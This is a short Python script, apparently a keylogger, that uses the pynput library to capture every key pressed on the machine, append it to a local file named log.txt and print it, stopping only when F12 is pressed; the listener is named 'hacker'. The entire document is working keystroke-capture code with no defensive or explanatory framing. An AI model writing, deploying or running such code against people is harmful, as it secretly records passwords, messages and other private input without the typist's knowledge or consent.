from pynput.keyboard import Listener

def a(key):
    key = str(key)
    key = key.replace("'","")
    if key == "Key.f12":
        raise SystemExit(0)
    if key == "Key.tab":
        key = "\t"
    if key == "Key.enter":
        key = "\n"
    

    with open("log.txt", "a") as file:
        file.write(key)
    print(key)

with Listener(on_press=a) as hacker:
    hacker.join() 